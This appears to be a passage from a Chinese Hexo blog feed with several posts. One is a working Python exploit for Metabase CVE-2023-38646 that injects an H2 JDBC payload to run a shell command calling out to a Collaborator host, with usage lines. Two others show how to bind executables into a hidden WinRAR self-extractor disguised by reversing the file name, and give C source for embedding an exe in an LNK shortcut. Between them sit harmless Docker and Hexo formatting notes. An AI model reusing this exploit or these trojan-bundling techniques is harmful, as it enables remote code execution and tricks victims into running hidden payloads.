class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&quot;Target URL.&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-t&quot;</span>, <span class="string">&quot;--token&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&quot;Setup-Token From /api/session/properties .&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;--collabrator&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&quot;Burp Collabrator Client.&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">url = args.url + <span class="string">&quot;/api/setup/validate&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">payload=&#123;<span class="string">&quot;details&quot;</span>: &#123;<span class="string">&quot;details&quot;</span>: &#123;<span class="string">&quot;advanced-options&quot;</span>: <span class="literal">True</span>, <span class="string">&quot;classname&quot;</span>: <span class="string">&quot;org.h2.Driver&quot;</span>, <span class="string">&quot;subname&quot;</span>: <span class="string">&quot;mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS SHELLEXEC AS $$ void shellexec(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(new String[]&#123;\&quot;sh\&quot;, \&quot;-c\&quot;, cmd&#125;)\\;&#125;$$\\;CALL SHELLEXEC(&#x27;curl -d key=0xRobiul &quot;</span> + args.collabrator +<span class="string">&quot;&#x27;);&quot;</span>, <span class="string">&quot;subprotocol&quot;</span>: <span class="string">&quot;h2&quot;</span>&#125;, <span class="string">&quot;engine&quot;</span>: <span class="string">&quot;postgres&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;x&quot;</span>&#125;, <span class="string">&quot;token&quot;</span>: args.token&#125;</span><br><span class="line">attk = requests.post(url, headers=headers, json=payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Cyan + <span class="string">&quot;Done!! Check Burp Colabrator!!&quot;</span> + STOP)</span><br></pre></td></tr></table></figure><p><strong>使用方法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-2023-38646.py -u 目标url:port -t token -c Burp_Collabrator_Client</span><br><span class="line"><span class="comment"># 例如：python3 CVE-2023-38646.py -u 127.0.0.1:3000 -t 141c5a35-3b1d-4c1b-8eca-0591111fa08c -c wwwkzg5j2qxyxqm836v2fxj34ualybm0.oastify.com</span></span><br></pre></td></tr></table></figure><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a><a href="https://github.com/metabase/metabase/pull/32924/files">修复</a></h2>]]></content>
      
      
      <categories>
          
          <category> CVE剖析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker环境搭建</title>
      <link href="/post/2dc21646.html"/>
      <url>/post/2dc21646.html</url>
      
        <content type="html"><![CDATA[<h2 id="Windows搭建docker"><a href="#Windows搭建docker" class="headerlink" title="Windows搭建docker"></a>Windows搭建docker</h2><ol><li><p><strong>下载</strong><code>Docker Desktop for Windows</code>：<a href="https://docs.docker.com/desktop/install/windows-install/">Install Docker Desktop on Windows</a></p></li><li><p>双击 <code>Docker Desktop Installer.exe</code> 安装</p></li><li>直接打开<code>docker</code>面板或者命令行窗口使用<code>docker</code>命令运行</li></ol><h2 id="kali搭建docker"><a href="#kali搭建docker" class="headerlink" title="kali搭建docker"></a><a href="https://blog.csdn.net/aodechudawei/article/details/122450720">kali搭建docker</a></h2><h2 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h2><h3 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull git.mamahaha.work/sangge/yacl:latest</span><br></pre></td></tr></table></figure><h3 id="查看所有容器"><a href="#查看所有容器" class="headerlink" title="查看所有容器"></a>查看所有容器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><h3 id="创建容器"><a href="#创建容器" class="headerlink" title="创建容器"></a>创建容器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -it 镜像ID</span><br></pre></td></tr></table></figure><h3 id="运行容器"><a href="#运行容器" class="headerlink" title="运行容器"></a>运行容器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 容器ID bash</span><br></pre></td></tr></table></figure><h3 id="查看正在运行的容器"><a href="#查看正在运行的容器" class="headerlink" title="查看正在运行的容器"></a>查看正在运行的容器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><h3 id="退出容器"><a href="#退出容器" class="headerlink" title="退出容器"></a>退出容器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure><details class="folding-tag" ><summary> docker面板截图 </summary>              <div class='content'>              <p><img src="https://img.gejiba.com/images/62d1f9d1599af5bb9a3de4ca9fbb9ab6.png" alt="image-20230804014322265"></p>              </div>            </details><h2 id="docker常用命令"><a href="#docker常用命令" class="headerlink" title="docker常用命令"></a>docker常用命令</h2><details class="folding-tag" ><summary> docker常见命令 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/08/07/pPEYC3d.png" alt="Docker"></p>              </div>            </details><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>删除容器会直接清除容器数据，保存容器数据可以使用<a href="https://juejin.cn/post/7258321382156091448">Volumes</a></p>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设置同级分类与父子分类</title>
      <link href="/post/34d98901.html"/>
      <url>/post/34d98901.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>转载自：<a href="https://www.jianshu.com/p/bff1b1845ac9">Hexo 一篇文章多个 categories</a></p><h2 id="父子分类"><a href="#父子分类" class="headerlink" title="父子分类"></a>父子分类</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">categories:</span><br><span class="line"><span class="bullet">-</span> 博客</span><br><span class="line"><span class="bullet">-</span> 搭建</span><br></pre></td></tr></table></figure><h2 id="同级分类"><a href="#同级分类" class="headerlink" title="同级分类"></a>同级分类</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">categories:</span><br><span class="line"><span class="bullet">-</span> [CVE]</span><br><span class="line"><span class="bullet">-</span> [捆绑]</span><br></pre></td></tr></table></figure><h2 id="同级分类复合父子分类"><a href="#同级分类复合父子分类" class="headerlink" title="同级分类复合父子分类"></a>同级分类复合父子分类</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">categories:</span><br><span class="line"><span class="bullet">-</span> [CVE, poc分析]</span><br><span class="line"><span class="bullet">-</span> [捆绑, 源码]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>折叠框与tab分栏</title>
      <link href="/post/b78500b8.html"/>
      <url>/post/b78500b8.html</url>
      
        <content type="html"><![CDATA[<h2 id="折叠框"><a href="#折叠框" class="headerlink" title="折叠框"></a>折叠框</h2><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><details class="folding-tag" ><summary> 折叠框 </summary>              <div class='content'>              <p><img src="https://img.gejiba.com/images/14dde51410fd3a6f9e27d8e975c87c4b.png" alt="上岸"></p>              </div>            </details><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% folding 折叠框 %&#125;</span><br><span class="line">![<span class="string">img</span>](<span class="link">图片url</span>)</span><br><span class="line">&#123;% endfolding %&#125;</span><br></pre></td></tr></table></figure><h2 id="tab分栏"><a href="#tab分栏" class="headerlink" title="tab分栏"></a>tab分栏</h2><h3 id="效果-1"><a href="#效果-1" class="headerlink" title="效果"></a>效果</h3><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">1号分栏</button></li><li class="tab"><button type="button" data-href="#分栏-2">2号分栏</button></li><li class="tab"><button type="button" data-href="#分栏-3">3号分栏</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><p>This is Tab 1.</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>This is Tab 2.</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>This is Tab 3.</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注：</span><br><span class="line">1. &#123;% tabs %&#125;如果不命名会有警告，但是没有什么影响我就没有管</span><br><span class="line">2. 如果只是想引用&#123;% tabs %&#125;的话，不可以写在外面，否则会被当作分栏标志触发报错！</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs 分栏 %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab 1号分栏 --&gt;</span><br><span class="line"></span><br><span class="line">This is Tab 1.</span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab 2号分栏 --&gt;</span><br><span class="line"></span><br><span class="line">This is Tab 2.</span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab 3号分栏 --&gt;</span><br><span class="line"></span><br><span class="line">This is Tab 3.</span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><h2 id="折叠框叠加tab分栏"><a href="#折叠框叠加tab分栏" class="headerlink" title="折叠框叠加tab分栏"></a>折叠框叠加tab分栏</h2><h3 id="效果-2"><a href="#效果-2" class="headerlink" title="效果"></a>效果</h3><details class="folding-tag" ><summary> 折叠框 </summary>              <div class='content'>              <div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">1号分栏</button></li><li class="tab"><button type="button" data-href="#-2">2号分栏</button></li><li class="tab"><button type="button" data-href="#-3">3号分栏</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><p>This is Tab 1.</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><p>This is Tab 2.</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><p>This is Tab 3.</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>              </div>            </details><h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;% folding 折叠框 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% tabs %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab 1号分栏 --&gt;</span><br><span class="line"></span><br><span class="line">This is Tab 1.</span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab 2号分栏 --&gt;</span><br><span class="line"></span><br><span class="line">This is Tab 2.</span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab 3号分栏 --&gt;</span><br><span class="line"></span><br><span class="line">This is Tab 3.</span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endtabs %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 美化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WinRar自解压</title>
      <link href="/post/8b352432.html"/>
      <url>/post/8b352432.html</url>
      
        <content type="html"><![CDATA[<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><details class="folding-tag" ><summary> 选中源文件和需要捆绑的文件，右键添加到压缩文件 </summary>              <div class='content'>              <p><img src="https://img.gejiba.com/images/623b67b9be12ec09be27cf37e07e86a8.png" alt="image-20230729085927120"></p>              </div>            </details><details class="folding-tag" ><summary> 自解压格式->高级自解压选项 </summary>              <div class='content'>              <p><img src="https://img.gejiba.com/images/7f33ce2f3cb4aa085549d8d7c52b9e97.png" alt="image-20230729090043272"></p>              </div>            </details><details class="folding-tag" ><summary> 设置解压缩路径，%temp%是临时文件的存储路径 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/07/29/pPSuHHO.png" alt="image-20230729090155819"></p>              </div>            </details><p><strong>源文件是一定要执行的，捆绑的文件是否执行看自己需求，执行的话是显式的，除非你的程序没有界面什么的</strong></p><details class="folding-tag" ><summary> 设置解压后执行的程序 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/07/29/pPSuLUe.png" alt="image-20230729090205703"></p>              </div>            </details><p><strong>模式一定要选择<code>隐藏全部</code>，否则会出现自解压界面</strong></p><details class="folding-tag" ><summary> 解压模式 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/07/29/pPSuO4H.png" alt="image-20230729090223158"></p>              </div>            </details><details class="folding-tag" ><summary> 解压并替换文件；覆盖全部文件 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/07/29/pPSuqED.png" alt="image-20230729090658997"></p>              </div>            </details><details class="folding-tag" ><summary> 双击生成的自解压文件，两个文件均被执行 </summary>              <div class='content'>              <p><img src="https://img.gejiba.com/images/e734dd4c092308fbfc811a3c443002d9.png" alt="image-20230729093014870"></p>              </div>            </details><details class="folding-tag" ><summary> 文件解压到了%temp%路径 </summary>              <div class='content'>              <p><img src="https://img.gejiba.com/images/299db08563d84eddd3d814dd9b488b7b.png" alt="image-20230729093042408"></p>              </div>            </details><details class="folding-tag" ><summary> 自解压文件可以改改名字：这里使用`Unicode控制字符`实现文件名反转 </summary>              <div class='content'>              <p><img src="https://img.gejiba.com/images/41dc4339d00365b743342c54bd39f9b8.png" alt="image-20230729093515314"></p>              </div>            </details><details class="folding-tag" ><summary> 效果 </summary>              <div class='content'>              <p><img src="https://img.gejiba.com/images/4581840bd765b95ccb062534afee0584.png" alt="image-20230729093419746"></p>              </div>            </details><p><strong>另外可以用<code>resource hacker</code>改改图标资源什么的</strong></p>]]></content>
      
      
      <categories>
          
          <category> 捆绑 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 捆绑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lnk捆绑执行exe</title>
      <link href="/post/ba5041c3.html"/>
      <url>/post/ba5041c3.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>转载自：<a href="https://www.x86matthew.com/view_post?id=embed_exe_lnk"><strong>EmbedExeLnk</strong></a></p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="编译源码"><a href="#编译源码" class="headerlink" title="编译源码"></a>编译源码</h3><p>注：报错的解决在下面</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INVALID_SET_FILE_POINTER 0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HasName 0x00000004</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HasArguments 0x00000020</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HasIconLocation 0x00000040</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IsUnicode 0x00000080</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HasExpString 0x00000200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PreferEnvironmentPath 0x02000000</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ShellLinkHeaderStruct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">DWORD dwHeaderSize;</span><br><span class="line">CLSID LinkCLSID;</span><br><span class="line">DWORD dwLinkFlags;</span><br><span class="line">DWORD dwFileAttributes;</span><br><span class="line">FILETIME CreationTime;</span><br><span class="line">FILETIME AccessTime;</span><br><span class="line">FILETIME WriteTime;</span><br><span class="line">DWORD dwFileSize;</span><br><span class="line">DWORD dwIconIndex;</span><br><span class="line">DWORD dwShowCommand;</span><br><span class="line">WORD wHotKey;</span><br><span class="line">WORD wReserved1;</span><br><span class="line">DWORD dwReserved2;</span><br><span class="line">DWORD dwReserved3;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EnvironmentVariableDataBlockStruct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">DWORD dwBlockSize;</span><br><span class="line">DWORD dwBlockSignature;</span><br><span class="line"><span class="type">char</span> szTargetAnsi[MAX_PATH];</span><br><span class="line"><span class="type">wchar_t</span> wszTargetUnicode[MAX_PATH];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">CreateLinkFile</span><span class="params">(<span class="type">char</span> *pExePath, <span class="type">char</span> *pOutputLinkPath, <span class="type">char</span> *pLinkIconPath, <span class="type">char</span> *pLinkDescription)</span></span><br><span class="line">&#123;</span><br><span class="line">HANDLE hLinkFile = <span class="literal">NULL</span>;</span><br><span class="line">HANDLE hExeFile = <span class="literal">NULL</span>;</span><br><span class="line">ShellLinkHeaderStruct ShellLinkHeader;</span><br><span class="line">EnvironmentVariableDataBlockStruct EnvironmentVariableDataBlock;</span><br><span class="line">DWORD dwBytesWritten = <span class="number">0</span>;</span><br><span class="line">WORD wLinkDescriptionLength = <span class="number">0</span>;</span><br><span class="line"><span class="type">wchar_t</span> wszLinkDescription[<span class="number">512</span>];</span><br><span class="line">WORD wCommandLineArgumentsLength = <span class="number">0</span>;</span><br><span class="line"><span class="type">wchar_t</span> wszCommandLineArguments[<span class="number">8192</span>];</span><br><span class="line">WORD wIconLocationLength = <span class="number">0</span>;</span><br><span class="line"><span class="type">wchar_t</span> wszIconLocation[<span class="number">512</span>];</span><br><span class="line">BYTE bExeDataBuffer[<span class="number">1024</span>];</span><br><span class="line">DWORD dwBytesRead = <span class="number">0</span>;</span><br><span class="line">DWORD dwEndOfLinkPosition = <span class="number">0</span>;</span><br><span class="line">DWORD dwCommandLineArgsStartPosition = <span class="number">0</span>;</span><br><span class="line"><span 